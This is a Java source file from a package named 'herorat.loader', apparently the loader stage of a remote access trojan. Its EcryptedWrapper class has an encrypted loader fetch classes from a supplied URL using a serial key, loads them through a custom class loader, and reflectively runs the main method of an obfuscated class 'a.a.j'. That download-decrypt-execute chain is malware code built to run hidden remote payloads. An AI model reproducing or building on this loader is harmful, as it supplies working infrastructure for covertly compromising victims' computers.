package net.herorat.loader;

public class EcryptedWrapper implements Runnable
{
	private EncryptedClassLoader classLoader;
	
	private String url;
	private String serial;
	private String expiration_date;

	public EcryptedWrapper(String url, String serial, String expiration_date)
	{
		this.url = url;
		this.serial = serial;
		this.expiration_date = expiration_date;
	}

	public void load()
	{
		EncryptedLoader loader = new EncryptedLoader(this.serial, this.url);
		try
		{
			loader.load();
			classLoader = new EncryptedClassLoader(loader.getClasses(), loader.getResources());
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}

	public void run()
	{
		try
		{
			Class<?> c = classLoader.loadClass("a.a.j");
			c.getMethod("main", new Class[] { java.lang.String[].class}).invoke(null, new Object[]{new String[] {this.expiration_date}});
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	}
}